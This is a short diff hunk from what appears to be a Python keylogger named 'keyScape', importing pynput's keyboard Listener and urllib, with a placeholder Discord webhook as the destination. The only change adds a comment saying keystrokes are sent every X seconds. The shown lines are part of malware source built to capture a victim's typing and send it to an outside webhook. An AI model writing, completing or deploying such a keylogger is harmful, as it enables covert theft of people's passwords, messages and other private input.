@@ -4,7 +4,7 @@ from pynput.keyboard import Listener, Key
 from urllib.request import Request, urlopen
 
 discord = 'DISCORD_WEBHOOK'
-timer = 60
+timer = 60 # sends keystrokes Every X seconds
 
 class keyScape:
         def __init__(self, discord, timer):
